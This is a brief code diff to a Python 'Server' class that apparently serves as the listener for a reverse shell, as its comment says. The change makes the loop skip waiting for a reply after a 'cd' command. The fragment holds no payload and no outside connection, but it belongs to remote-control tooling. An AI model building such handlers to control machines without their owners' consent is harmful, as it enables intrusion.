@@ -28,6 +28,8 @@ class Server:
             self.reliable_send(command)
             if command == "q":
                 break
+            elif command[:2] == "cd" and len(command) > 1:
+                continue
             else:
                 answer = self.reliable_receive()
                 # print the answer from the reverse shell
